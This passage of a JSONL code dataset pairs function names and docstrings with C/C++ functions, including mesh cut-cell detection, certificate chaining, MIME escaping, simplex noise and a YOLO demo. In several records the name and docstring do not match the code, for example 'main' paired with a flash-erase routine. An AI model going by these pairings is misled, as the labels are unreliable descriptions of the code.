AudioWriter(options);\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Raw )\\n    {\\n        hr = RawWriter(options);\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Eject )\\n    {\\n        hr = EjectClose(options, FALSE);\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Close )\\n    {\\n        hr = EjectClose(options, TRUE);\\n    }\\n\\n    if (SUCCEEDED(coInitHr))\\n    {\\n        CoUninitialize();\\n    }\\n\\n    GetSystemTime(&endTime);\\n\\n    CalcElapsedTime(&startTime, &endTime, &elapsedTime);\\n    printf(\" - Total Time: %02d:%02d:%02d\\\\n\", elapsedTime.wHour,\\n           elapsedTime.wMinute,\\n           elapsedTime.wSecond);\\n\\n    if (SUCCEEDED(hr))\\n        return 0;\\n    else\\n    {\\n        PrintHR(hr);\\n        return 1;\\n    }\\n}'}","id":2498}
{"content":"{'function_name': 'citanje_dolazaka_poslova', 'docstring': '\/\/citanje datoteke red po red', 'code': 'void citanje_trajanja_poslova(int N){\\n\\n\\t\/\/varijabla za u\u010ditavanje redova\\n\\tstring redak;\\n\\t\/\/brojac redaka\\n\\tint brojac=0;\\n\\t\/\/pocetna vrijednost u datoteci\\n\\tint redovi, kolone;\\n\\t\/\/broj poslova u ovom ispitivanju\\n\\tint broj_aktivnih_poslova=vektor_poslova[N];\\n\\t\/\/broj strojeva u ovom ispitivanju\\n\\tint broj_aktivnih_strojeva=vektor_strojeva[N];\\n\\t\/\/broj podataka za jedno ispitivanje\\n\\tint broj_podataka=broj_aktivnih_poslova*broj_aktivnih_strojeva;\\n\\n\\t\/\/ime glavne ulazne datoteke\\n\\tifstream ulazna(trajanja_poslova.c_str());\\n\\n\\tif(!ulazna){\\n\\t\\tcout<<\"Pogreska prilikom otvaranja datoteke! Datoteka \"<<dolasci_poslova<<\" nije uspjesno otvorena ili se ne nalazi u trenutnom direktoriju\"<<endl;\\n\\t\\treturn;\\n\\t}\\n\\n\\t\/\/citanje datoteke red po red\\n\\twhile(getline(ulazna,redak)){\\n\\n\\t\\tstring poms;\\n\\t\\tstringstream sTok(redak);\\n\\t\\t\/\/ucitavam sTok u poms\\n\\t\\tint pomi;\\n\\n\\t\\tif(brojac==0){\\n\\t\\t\\tsTok>>redovi;\\n\\t\\t\\tsTok>>kolone;\\n\\n\\t\\t\\tif((redovi!=konstante.broj_skupova) || (kolone!=(konstante.max_br_poslova*konstante.max_br_strojeva))){\\n\\t\\t\\t\\tcout<<\"Procitana datoteka nije kompatibilna sa zadanim problemom. Prekid rada.\"<<endl;\\n\\t\\t\\t\\treturn;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif(brojac==(N+1)){\\n\\n\\t\\t\\tfor(int i=0;i<broj_aktivnih_poslova;i++){\\n\\t\\t\\t\\tfor(int j=0;j<broj_aktivnih_strojeva;j++){\\n\\t\\t\\t\\t\\tsTok>>pomi;\\n\\t\\t\\t\\t\\tposlovi[i].trajanje.push_back(pomi);\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\n\\t\\tbrojac++;\\n\\t}\\n}'}","id":2502}
{"content":"{'function_name': 'detect_cut_cells2', 'docstring': '\/\/typedef typename cuthho_mesh<T, ET>::cell_type cell_type;', 'code': 'void\\ndetect_cut_cells3(cuthho_mesh<T, ET>& msh, const Function& level_set_function)\\n{\\n    \/\/std::cout<<\"I AM IN DETECT CUT CELL3!!!!\"<<std::endl;\\n    timecounter tc;\\n    tc.tic();\\n    \/\/typedef typename cuthho_mesh<T, ET>::face_type  face_type;\\n    typedef typename cuthho_mesh<T, ET>::point_type point_type;\\n    \/\/typedef typename cuthho_mesh<T, ET>::cell_type cell_type;\\n    T iso_val_interface = level_set_function.iso_val_interface ;\\n    \/\/std::cout<<\"iso_val_interface = \"<<iso_val_interface<<std::endl;\\n    size_t cell_i = 0;\\n    for (auto& cl : msh.cells)\\n    {\\n        auto fcs = faces(msh, cl);\\n        std::array< std::pair<size_t, point_type>, 2 >  cut_faces;\\n\\n        size_t k = 0;\\n        for (size_t i = 0; i < fcs.size(); i++)\\n        {\\n            if ( is_cut(msh, fcs[i]) )\\n                cut_faces.at(k++) = std::make_pair(i, fcs[i].user_data.intersection_point);\\n        }\\n\\n        \/* If a face is cut, the cells that own the face are cut. Is this\\n         * unconditionally true? It should...fortunately this isn\\'t avionics\\n         * software *\/\\n\\n        if (k == 0)\\n        {\\n            \\n            auto is_positive = [&](const point_type& pt) -> bool {\\n            return level_set_function(pt,msh,cl) > iso_val_interface;\\n            };\\n            \\n            \\n            auto pts = points(msh, cl);\\n            \\n            if ( std::all_of(pts.begin(), pts.end(), is_positive) )\\n                cl.user_data.location = element_location::IN_POSITIVE_SIDE;\\n            else\\n                cl.user_data.location = element_location::IN_NEGATIVE_SIDE;\\n     \\n            \\n            \\n            \\n            \/*\\n            auto pts = points(msh, cl);\\n            auto pt = pts.begin();\\n            size_t counter = 0;\\n            while( ( pt!= pts.end() ) && ( level_set_function(*pt,msh,cl) > 0 ) )\\n            {\\n                counter++;\\n                pt++;\\n                \\n            }\\n             \\n            if ( counter == pts.size() )\\n                cl.user_data.location = element_location::IN_POSITIVE_SIDE;\\n            else\\n                cl.user_data.location = element_location::IN_NEGATIVE_SIDE;\\n            *\/\\n             \\n        }\\n        \/\/MODIFICARE QUAAAA\\n        if (k == 2)\\n        {\\n            cl.user_data.location = element_location::ON_INTERFACE;\\n            auto p0 = cut_faces[0].second;\\n            auto p1 = cut_faces[1].second;\\n            auto pt = p1 - p0;\\n            auto pn = p0 + point<T,2>(-pt.y(), pt.x());\\n            auto pn_prova = (p0+p1)\/2.0 + 0.5*point<T,2>(-pt.y(), pt.x());\\n            \/\/if(offset(msh,cl)== 119)\\n            \/\/    std::cout<<\"p0 = \"<<p0<< \" , p1 =\"<<p1<<std::endl;\\n            \/\/ PRIMA ERA DA p0 ->   MODIFCATO, ora \u00e8 pt  medio!\\n            \/*\\n            if( !pt_in_cell(msh, pn, cl) )\\n            {\\n                std::cout<<\"I chose another pn to ordering interface_points in \\'detect_cut_cells2\\'.\"<<std::endl;\\n                T m_half = ( ps1.y() - pm.y() )\/( ps1.x() - pm.x() );\\n                T q = pm.y() - m_half * pm.x() ;\\n                auto pt_bdry = search_boundary( msh , cl , pm , m_half , q , lm , level_set_function ) ;\\n                auto lm_bdry = level_set_function( pt_bdry , msh , cl );\\n            }\\n            *\/\\n            \/*\\n            if(offset(msh,cl)== 137 || offset(msh,cl)== 138 || offset(msh,cl)== 134||offset(msh,cl)== 103){\\n                std::cout<<yellow<<bold<<\"offset(msh,cl) = \"<<offset(msh,cl)<<reset<<std::endl;\\n                auto pn_bis = (p0+p1)\/2.0 + point<T,2>(-pt.y(), pt.x());\\n                std::cout<<\"pn_bis = \"<<pn_bis<< \" , level_set_function(pn_bis,msh,cl) =\"<<level_set_function(pn_bis,msh,cl) <<std::endl;\\n                auto pn_bis0 = (p0+p1)\/2.0 + 0.5* point<T,2>(-pt.y(), pt.x());\\n                std::cout<<\"pn_bis0 = \"<<pn_bis0<< \" , level_set_function(pn_bis0,msh,cl) =\"<<level_set_function(pn_bis0,msh,cl) <<std::endl;\\n                auto pn_bis1 = p0 + 0.5 * point<T,2>(-pt.y(), pt.x());\\n                std::cout<<\"pn_bis1 = \"<<pn_bis1<< \" , level_set_function(pn_bis1,msh,cl) =\"<<level_set_function(pn_bis1,msh,cl)<<\\'\\\\n\\' <<std::endl;\\n                \\n                std::cout<<\"pn = \"<<pn<< \" , p0 = \"<<p0<< \" , p1 = \"<<p1<<std::endl;\\n                std::cout<<\"level_set_function(pn,msh,cl) = \"<<level_set_function(pn,msh,cl)<< \" , level_set_function(p0,msh,cl) = \"<<level_set_function(p0,msh,cl)<< \" , level_set_function(pn,msh,cl) = \"<<level_set_function(p1,msh,cl)<<std::endl;\\n                std::cout<<\"p0 - point<T,2>(-pt.y(), pt.x()) = \"<<p0 - point<T,2>(-pt.y(), pt.x())<< \" , level_set_function(p0 - point<T,2>(-pt.y(), pt.x()),msh,cl) = \"<<level_set_function(p0 - point<T,2>(-pt.y(), pt.x()),msh,cl)<<std::endl;\\n            }\\n            *\/\\n            \\n            if( !(signbit(level_set_function(pn,msh,cl)-iso_val_interface) == signbit(level_set_function(pn_prova,msh,cl) -iso_val_interface) ) ){\\n                std::cout<<\"p0 = \"<<p0<< \" , p1 = \"<<p1<< std::endl;\\n                std::cout<<\"pn = \"<<pn<< \" , pn_prova = \"<<pn_prova<< \" , level_set_function(pn,msh,cl) = \"<<level_set_function(pn,msh,cl)<< \" , level_set_function(pn_prova,msh,cl) = \"<<level_set_function(pn_prova,msh,cl) <<std::endl;\\n                pn = pn_prova ;\\n            }\\n            \\n            if ( level_set_function(pn,msh,cl) >= iso_val_interface )\\n            {\\n                cl.user_data.p0 = p1;\\n                cl.user_data.p1 = p0;\\n            }\\n            else\\n            {\\n                cl.user_data.p0 = p0;\\n                cl.user_data.p1 = p1;\\n            }\\n\\n            cl.user_data.interface.push_back(cl.user_data.p0);\\n            cl.user_data.interface.push_back(cl.user_data.p1);\\n        }\\n\\n        if ( k != 0 && k != 2 ){\\n            auto pts = points(msh,cl);\\n            std::cout<<\"Point[0] = \"<<pts[0]<<\" , point[1] = \"<<pts[1]<<\" , point[2] = \"<<pts[2]<<\" , point[3] = \"<<pts[3]<<std::endl;\\n            std::cout<<\"level_set_function(p0) = \"<<level_set_function(pts[0],msh,cl) << \" , level_set_function(p1) = \"<<level_set_function(pts[1],msh,cl)<< \" , level_set_function(p2) = \"<<level_set_function(pts[2],msh,cl)<< \" , level_set_function(p3) = \"<<level_set_function(pts[3],msh,cl)<<std::endl;\\n            for (size_t i = 0; i < fcs.size(); i++)\\n            {\\n                if ( is_cut(msh, fcs[i]) )\\n                  std::cout<<\"fcs[i].user_data.intersection_point = \"<<fcs[i].user_data.intersection_point<<std::endl;\\n            }\\n           \\n            std::cout<<\"ERROR: in cut cell \"<<cell_i<<\" there are k = \"<<k<<\" cuts!!!!\"<<std::endl;\\n            throw std::logic_error(\" --> Invalid number of cuts in cell\");\\n            \\n        }\\n\\n        cell_i++;\\n    }\\n    tc.toc();\\n    \/\/std::cout << bold << yellow << \"detect_cut_cells3, time resolution: \" << tc << \" seconds\" << reset << std::endl;\\n}'}","id":2504}
{"content":"{'function_name': 'TLSVerifyProprietyChainedCertificate', 'docstring': '\/\/\\r', 'code': \"DWORD\\r\\nChainProprietyCert(\\r\\n        HCRYPTPROV      hCryptProv,\\r\\n        HCERTSTORE      hCertStore, \\r\\n        PCCERT_CONTEXT  pCertContext, \\r\\n        PCert_Chain     pCertChain,\\r\\n        DWORD*          dwCertOffset,\\r\\n        DWORD           dwBufSize)\\r\\n{\\r\\n    DWORD       dwStatus = ERROR_SUCCESS;\\r\\n    DWORD       dwFlags;\\r\\n    PCCERT_CONTEXT pCertIssuer=NULL;\\r\\n\\r\\n    pCertIssuer=NULL;\\r\\n    dwFlags = CERT_STORE_SIGNATURE_FLAG;\\r\\n\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Get the issuer's certificate from store\\r\\n    \/\/\\r\\n    pCertIssuer = CertGetIssuerCertificateFromStore(\\r\\n                                                hCertStore,\\r\\n                                                pCertContext,\\r\\n                                                pCertIssuer,\\r\\n                                                &dwFlags\\r\\n                                            );\\r\\n\\r\\n    if(pCertIssuer != NULL)\\r\\n    {\\r\\n        if(dwFlags & CERT_STORE_SIGNATURE_FLAG)\\r\\n        {\\r\\n            \/\/ invalid signature\\r\\n            dwStatus = TLS_E_INVALID_DATA;\\r\\n        }\\r\\n        else\\r\\n        {\\r\\n            \/\/\\r\\n            \/\/ Recursively find the issuer of the issuer's certificate\\r\\n            \/\/\\r\\n            dwStatus = ChainProprietyCert(\\r\\n                                    hCryptProv, \\r\\n                                    hCertStore, \\r\\n                                    pCertIssuer, \\r\\n                                    pCertChain, \\r\\n                                    dwCertOffset, \\r\\n                                    dwBufSize\\r\\n                                );\\r\\n        }\\r\\n    }\\r\\n    else \\r\\n    {\\r\\n        dwStatus = GetLastError();\\r\\n        if(dwStatus != CRYPT_E_SELF_SIGNED)\\r\\n        {\\r\\n            goto cleanup;\\r\\n        }\\r\\n\\r\\n        \/\/\\r\\n        \/\/ Verify issuer's certificate\\r\\n        \/\/\\r\\n        if(CryptVerifyCertificateSignature(\\r\\n                                   hCryptProv,\\r\\n                                   X509_ASN_ENCODING,\\r\\n                                   pCertContext->pbCertEncoded,\\r\\n                                   pCertContext->cbCertEncoded,\\r\\n                                   &pCertContext->pCertInfo->SubjectPublicKeyInfo))\\r\\n        {\\r\\n            dwStatus=ERROR_SUCCESS;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    if(dwStatus == ERROR_SUCCESS)\\r\\n    {\\r\\n        \/\/\\r\\n        \/\/ Push certificate into propriety certificate chain\\r\\n        \/\/\\r\\n        if((*dwCertOffset + pCertContext->cbCertEncoded) >= dwBufSize)\\r\\n        {\\r\\n            dwStatus = ERROR_MORE_DATA;\\r\\n            goto cleanup;\\r\\n        }\\r\\n\\r\\n        (pCertChain->dwNumCertBlobs)++;\\r\\n\\r\\n        UNALIGNED Cert_Blob *pCertBlob = (PCert_Blob)((PBYTE)&(pCertChain->CertBlob) + *dwCertOffset);\\r\\n        pCertBlob->cbCert = pCertContext->cbCertEncoded;\\r\\n        memcpy( &(pCertBlob->abCert),\\r\\n                pCertContext->pbCertEncoded,\\r\\n                pCertContext->cbCertEncoded);\\r\\n\\r\\n        *dwCertOffset += (sizeof(pCertBlob->cbCert) + pCertContext->cbCertEncoded);\\r\\n    }\\r\\n\\r\\ncleanup:\\r\\n\\r\\n    if(pCertIssuer != NULL)\\r\\n    {\\r\\n        CertFreeCertificateContext(pCertIssuer);\\r\\n    }\\r\\n\\r\\n    return dwStatus;\\r\\n}\"}","id":2506}
{"content":"{'function_name': 'main', 'docstring': '\/*\\n\\t * Clean simulator exit.\\n\\t *\/', 'code': 'int intFlashErase(flashaddr_t address, size_t) {\\n\\t\/\/ Try to delete the file, swallow any errors (we can overwrite it anyway)\\n\\ttry {\\n\\t\\tstd::filesystem::remove(makeFileName(address));\\n\\t} catch (...) { }\\n\\n\\treturn FLASH_RETURN_SUCCESS;\\n}'}","id":2515}
{"content":"{'function_name': 'det', 'docstring': '\/\/ simple determinant', 'code': 'double distance(const Vector3 & pt, const VectorXd &r)\\n{\\n  \/\/Distance between (pt) and (r(0) x + r(1) y + r(2) z + r(3) = 0)\\n\\n  return (r(0)*pt(0)+r(1)*pt(1)+r(2)*pt(2)+r(3))\/sqrt(r(0)*r(0)+r(1)*r(1)+r(2)*r(2));\\n}'}","id":2516}
{"content":"{'function_name': 'Hash128to64', 'docstring': '\/\/ Murmur-inspired hashing.\\r', 'code': 'STATIC_INLINE uint64_t HashLen16(uint64_t u, uint64_t v, uint64_t mul) {\\r\\n  \/\/ Murmur-inspired hashing.\\r\\n  uint64_t a = (u ^ v) * mul;\\r\\n  a ^= (a >> 47);\\r\\n  uint64_t b = (v ^ a) * mul;\\r\\n  b ^= (b >> 47);\\r\\n  b *= mul;\\r\\n  return b;\\r\\n}'}","id":2518}
{"content":"{'function_name': 'create_domain', 'docstring': '\/*\\n     * If we have daemonized then do not return to the caller -- this has\\n     * already happened in the parent.\\n     *\/', 'code': 'static void cd_insert(const char *dom, const char *virtdev, char *phys)\\n{\\n    libxl_device_disk disk; \/* we don\\'t free disk\\'s contents *\/\\n    char *buf = NULL;\\n    XLU_Config *config = 0;\\n\\n    find_domain(dom);\\n\\n    if (asprintf(&buf, \"vdev=%s,access=r,devtype=cdrom,target=%s\",\\n                 virtdev, phys ? phys : \"\") < 0) {\\n        fprintf(stderr, \"out of memory\\\\n\");\\n        return;\\n    }\\n\\n    parse_disk_config(&config, buf, &disk);\\n\\n    disk.backend_domid = 0;\\n\\n    libxl_cdrom_insert(ctx, domid, &disk, NULL);\\n\\n    libxl_device_disk_dispose(&disk);\\n    free(buf);\\n}'}","id":2520}
{"content":"{'function_name': 'MimeOleSplitContentType', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleEscapeString(CODEPAGEID cpiCodePage, LPCSTR pszIn, LPSTR *ppszOut)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT hr=S_FALSE;\\r\\n    LPSTR   pszOut,\\r\\n        psz;\\r\\n    ULONG   cb,\\r\\n        c;\\r\\n\\r\\n    \/\/ check parameters\\r\\n    if (NULL == pszIn || NULL == ppszOut)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ $$ INFO $$ This is basically as fast as doing an lstrlen\\r\\n    \/\/ I\\'ve decided to first detect if we need to escape\\r\\n    c = 0;\\r\\n    cb = 0;\\r\\n    psz = (LPSTR)pszIn;\\r\\n    while (*psz)\\r\\n    {\\r\\n        \/\/ If DBCS Lead-Byte, then skip\\r\\n        if (IsDBCSLeadByteEx(cpiCodePage, *psz))\\r\\n        {\\r\\n            cb  += 2;\\r\\n            psz += 2;\\r\\n        }\\r\\n\\r\\n        \/\/ Otherwise, text for escaped character\\r\\n        else\\r\\n        {\\r\\n            \/\/ Count the number of character to escape\\r\\n            if (\\'\\\\\"\\' == *psz || \\'\\\\\\\\\\' == *psz || \\'(\\' == *psz || \\')\\' == *psz)\\r\\n                c++;\\r\\n\\r\\n            \/\/ Step one more character\\r\\n            psz++;\\r\\n            cb++;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ No escape needed\\r\\n    if (0 == c)\\r\\n        goto exit;\\r\\n\\r\\n    \/\/ Adjust number of bytes to allocate\\r\\n    cb += (c + 1);\\r\\n\\r\\n    \/\/ worst case - escape every character, so use double original strlen\\r\\n    CHECKHR(hr = HrAlloc((LPVOID *)ppszOut, cb));\\r\\n\\r\\n    \/\/ Start copy\\r\\n    psz = (LPSTR)pszIn;\\r\\n    pszOut = *ppszOut;\\r\\n    while (*psz)\\r\\n    {\\r\\n        \/\/ If DBCS Lead-Byte, then skip\\r\\n        if (IsDBCSLeadByteEx(cpiCodePage, *psz))\\r\\n        {\\r\\n            *pszOut++ = *psz++;\\r\\n            *pszOut++ = *psz++;\\r\\n        }\\r\\n\\r\\n        \/\/ Otherwise, non-DBCS\\r\\n        else\\r\\n        {\\r\\n            \/\/ Do escape\\r\\n            if (\\'\\\\\"\\' == *psz || \\'\\\\\\\\\\' == *psz || \\'(\\' == *psz || \\')\\' == *psz)\\r\\n                *pszOut++ = \\'\\\\\\\\\\';\\r\\n\\r\\n            \/\/ Regular char\\r\\n            *pszOut++ = *psz++;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ Null term\\r\\n    *pszOut = \\'\\\\0\\';\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2521}
{"content":"{'function_name': 'R7Library_Init', 'docstring': '\/\/ Register your functions in this API.\\r', 'code': 'R7_API int R7Library_Close(void) {\\r\\n\\t\\t\/\/ If you have something to do before close R7(ex: free memory), you should handle them in this API.\\r\\n\\r\\n\\t\\t\/\/CURL\\r\\t\\tcurl_global_cleanup();\\r\\n\\r\\n\\t\\treturn 1;\\r\\n\\t}'}","id":2522}
{"content":"{'function_name': '_SetCollectionAlertDword', 'docstring': '\/\/ Free the list of names.\\r', 'code': 'STAHLSOFT_HRX_TRY(hr)\\r\\n\\t{\\r\\n\\t\\t\/\/ If the event can be opened, CfgWiz is running.\\r\\n\\t\\tStahlSoft::CSmartHandle CfgWizEvent;\\r\\n\\t\\tCfgWizEvent = ::OpenEvent(EVENT_ALL_ACCESS, FALSE, CfgWiz::SZ_GLOBAL_RUNNING_EVENT);\\r\\n\\t\\tif((HANDLE)CfgWizEvent != (HANDLE) NULL)\\r\\n\\t\\t\\treturn true;\\r\\n\\t}'}","id":2523}
{"content":"{'function_name': 'getLessPrefix', 'docstring': '\/\/now address[4] holds the four IP parts.', 'code': 'string seekBestMatch(map<string,node*>* array, int mask, string prefix){\\n\\t\/\/Function purpose is to find best matched prefix from less-bits tables compared to mask-bit table.\\n\\tint i = mask - 2;  \/\/beginning prefix length.\\n\\twhile(i >= 0){\\n\\t\\tmap<string,node*> ht = array[i];\\n\\t\\tstring r = getLessPrefix(prefix,i+1);\\n\\t\\tmap<string,node*>::iterator it = ht.find(r);  \/\/locate the key in this table.\\n\\t\\t\\tif(it != ht.end()){\/\/found matched node in this table\\n\\t\\t\\t\\tnode* n = it->second;\\n\\t\\t\\t\\tstringstream stringmask;\\n\\t\\t\\t\\tstringmask<< n->getMask();\\n\\t\\t\\t\\tstringstream stringnexthop;\\n\\t\\t\\t\\tstringnexthop<< n->getNexthop();\\n\\t\\t\\t\\treturn n->getBmp() + \" \" + stringmask.str() + \" \" + stringnexthop.str();\\n\\t\\t\\t}\\n\\t\\ti--;\\n\\t}\\n\\treturn \"null\";\\n}'}","id":2527}
{"content":"{'function_name': 'Grad', 'docstring': '\/\/ and compute the dot product with (x,y).', 'code': \"static float\\nSimplexNoise2D(float x, float y)\\n{\\n\\tconst float F2 = 0.366025403f; \/\/ F2 = 0.5*(sqrt(3.0)-1.0)\\n\\tconst float G2 = 0.211324865f; \/\/ G2 = (3.0-Math.sqrt(3.0))\/6.0\\n\\n\\tfloat n0, n1, n2; \/\/ Noise contributions from the three corners\\n\\n\\t\/\/ Skew the input space to determine which simplex cell we're in\\n\\tfloat s = (x + y) * F2; \/\/ Hairy factor for 2D\\n\\tfloat xs = x + s;\\n\\tfloat ys = y + s;\\n\\tint i = FloorReal32ToInt32(xs);\\n\\tint j = FloorReal32ToInt32(ys);\\n\\n\\tfloat t = (float)(i + j) * G2;\\n\\tfloat X0 = i - t; \/\/ Unskew the cell origin back to (x,y) space\\n\\tfloat Y0 = j - t;\\n\\tfloat x0 = x - X0; \/\/ The x,y distances from the cell origin\\n\\tfloat y0 = y - Y0;\\n\\n\\t\/\/ For the 2D case, the simplex shape is an equilateral triangle.\\n\\t\/\/ Determine which simplex we are in.\\n\\tint i1, j1; \/\/ Offsets for second (middle) corner of simplex in (i,j) coords\\n\\tif (x0 > y0) { i1 = 1; j1 = 0; } \/\/ lower triangle, XY order: (0,0)->(1,0)->(1,1)\\n\\telse { i1 = 0; j1 = 1; }      \/\/ upper triangle, YX order: (0,0)->(0,1)->(1,1)\\n\\n\\t\/\/ A step of (1,0) in (i,j) means a step of (1-c,-c) in (x,y), and\\n\\t\/\/ a step of (0,1) in (i,j) means a step of (-c,1-c) in (x,y), where\\n\\t\/\/ c = (3-sqrt(3))\/6\\n\\n\\tfloat x1 = x0 - i1 + G2; \/\/ Offsets for middle corner in (x,y) unskewed coords\\n\\tfloat y1 = y0 - j1 + G2;\\n\\tfloat x2 = x0 - 1.0f + 2.0f * G2; \/\/ Offsets for last corner in (x,y) unskewed coords\\n\\tfloat y2 = y0 - 1.0f + 2.0f * G2;\\n\\n\\t\/\/ Wrap the integer indices at 256, to avoid indexing perm[] out of bounds\\n\\tint ii = Absolute(i % 256);\\n\\tint jj = Absolute(j % 256);\\n\\n\\t\/\/ Calculate the contribution from the three corners\\n\\tfloat t0 = 0.5f - x0 * x0 - y0 * y0;\\n\\tif (t0 < 0.0f) n0 = 0.0f;\\n\\telse {\\n\\t\\tt0 *= t0;\\n\\t\\tn0 = t0 * t0 * Grad(PermutationTable[ii + PermutationTable[jj]], x0, y0);\\n\\t}\\n\\n\\tfloat t1 = 0.5f - x1 * x1 - y1 * y1;\\n\\tif (t1 < 0.0f) n1 = 0.0f;\\n\\telse {\\n\\t\\tt1 *= t1;\\n\\t\\tn1 = t1 * t1 * Grad(PermutationTable[ii + i1 + PermutationTable[jj + j1]], x1, y1);\\n\\t}\\n\\n\\tfloat t2 = 0.5f - x2 * x2 - y2 * y2;\\n\\tif (t2 < 0.0f) n2 = 0.0f;\\n\\telse {\\n\\t\\tt2 *= t2;\\n\\t\\tn2 = t2 * t2 * Grad(PermutationTable[ii + 1 + PermutationTable[jj + 1]], x2, y2);\\n\\t}\\n\\n\\t\/\/ Add contributions from each corner to get the final noise value.\\n\\t\/\/ The result is scaled to return values in the interval [-1,1].\\n\\treturn 40.0f * (n0 + n1 + n2);\\n}\"}","id":2531}
{"content":"{'function_name': 'ParseYOLOV3Output', 'docstring': '\/\/ --------------------------- Parsing YOLO Region output -------------------------------------', 'code': 'int main(int argc, char *argv[])\\n{\\n\\n    \/** This demo covers a certain topology and cannot be generalized for any object detection **\/\\n    std::cout << \"InferenceEngine: \" << GetInferenceEngineVersion() << std::endl;\\n\\n    \/\/ read input (video) frame\\n    std::string xml_path = \"\/home\/yolov4_tiny_3l\/models\/yolov4-tiny-3l_best.xml\";\\n    std::string bin_path = \"\";\\n    std::string image_path = \"\/home\/yolov4_tiny_3l\/models\/demo.jpg\";\\n\\n    cv::Mat frame = cv::imread(image_path);\\n\\n    cv::Mat next_frame = cv::imread(image_path);\\n    size_t height = frame.size().height;\\n    size_t width = frame.size().width;\\n\\n    Core ie;\\n    \/\/ --------------- 2. Reading the IR generated by the Model Optimizer (.xml and .bin files) ------------\\n    auto cnnNetwork = ie.ReadNetwork(xml_path);\\n\\n    \/** YOLOV3-based network should have one input and three output **\/\\n    \/\/ --------------------------- 3. Configuring input and output -----------------------------------------\\n    \/\/ --------------------------------- Preparing input blobs ---------------------------------------------\\n    InputsDataMap inputInfo(cnnNetwork.getInputsInfo());\\n    InputInfo::Ptr &input = inputInfo.begin()->second;\\n    auto inputName = inputInfo.begin()->first;\\n    input->setPrecision(Precision::U8); \/\/U8\\n\\n    input->getInputData()->setLayout(Layout::NCHW);\\n\\n    ICNNNetwork::InputShapes inputShapes = cnnNetwork.getInputShapes();\\n    SizeVector &inSizeVector = inputShapes.begin()->second;\\n    inSizeVector[0] = 1; \/\/ set batch to 1\\n    cnnNetwork.reshape(inputShapes);\\n    \/\/ --------------------------------- Preparing output blobs -------------------------------------------\\n\\n    OutputsDataMap outputInfo(cnnNetwork.getOutputsInfo());\\n    for (auto &output : outputInfo)\\n    {\\n        output.second->setPrecision(Precision::FP32);\\n        output.second->setLayout(Layout::NCHW);\\n    }\\n\\n    \/\/ --------------------------- 4. Loading model to the device ------------------------------------------\\n\\n    ExecutableNetwork network = ie.LoadNetwork(cnnNetwork, \"CPU\");\\n\\n    \/\/ -----------------------------------------------------------------------------------------------------\\n\\n    \/\/ --------------------------- 5. Creating infer request -----------------------------------------------\\n    InferRequest::Ptr infer_request = network.CreateInferRequestPtr();\\n    \/\/ -----------------------------------------------------------------------------------------------------\\n\\n    \/\/ --------------------------- 6. Doing inference -----------------------------------------------------\\n\\n    FrameToBlob(frame, infer_request, inputName);\\n\\n    infer_request->Infer();\\n\\n    \/\/ ---------------------------Processing output blobs--------------------------------------------------\\n    \/\/ Processing results of the CURRENT request\\n\\n    const TensorDesc &inputDesc = inputInfo.begin()->second.get()->getTensorDesc();\\n    unsigned long resized_im_h = 288; \/\/getTensorHeight(inputDesc);\\n    unsigned long resized_im_w = 288; \/\/getTensorWidth(inputDesc);\\n    std::vector<DetectionObject> objects;\\n    \/\/ Parsing outputs\\n    for (auto &output : outputInfo)\\n    {\\n        auto output_name = output.first;\\n\\n        std::string sub_str = \"Split\";\\n        string::size_type idx = output_name.find(sub_str);\\n        if (idx != string::npos)\\n        {\\n            continue;\\n        }\\n\\n        std::cout << output_name << std::endl;\\n        Blob::Ptr blob = infer_request->GetBlob(output_name);\\n\\n        ParseYOLOV3Output(cnnNetwork, output_name, blob, resized_im_h, resized_im_w, height, width, 0.1, objects);\\n    }\\n\\n    \/\/ Filtering overlapping boxes\\n    std::sort(objects.begin(), objects.end(), std::greater<DetectionObject>());\\n    for (size_t i = 0; i < objects.size(); ++i)\\n    {\\n        if (objects[i].confidence == 0)\\n            continue;\\n        for (size_t j = i + 1; j < objects.size(); ++j)\\n            if (IOU(objects[i], objects[j]) >= 0.4)\\n                objects[j].confidence = 0;\\n    }\\n\\n    std::cout << objects.size() << std::endl;\\n    \/\/ Drawing boxes\\n    for (auto &object : objects)\\n    {\\n        if (object.confidence < 0.3)\\n            continue;\\n        auto label = object.class_id;\\n        float confidence = object.confidence;\\n        if (confidence >= 0.3)\\n        {\\n            std::string ss;\\n            ss = std::to_string(label) + \":\" + std::to_string(confidence);\\n            cv::Point origin;\\n            origin.x = object.xmin;\\n            origin.y = object.ymin;\\n            int font_face = cv::FONT_HERSHEY_COMPLEX;\\n            double font_scale = 1;\\n            int thickness = 1;\\n            cv::putText(frame, ss, origin, font_face, font_scale, cv::Scalar(0, 255, 0), thickness);\\n\\n            \/** Drawing only objects when >confidence_threshold probability **\/\\n            cv::rectangle(frame, cv::Point2f(static_cast<float>(object.xmin), static_cast<float>(object.ymin)),\\n                          cv::Point2f(static_cast<float>(object.xmax), static_cast<float>(object.ymax)), cv::Scalar(0, 0, 255));\\n        }\\n    }\\n    cv::imwrite(\"\/home\/yolov4_tiny_3l\/models\/demo3.jpg\", frame);\\n\\n    return 0;\\n}'}","id":2540}
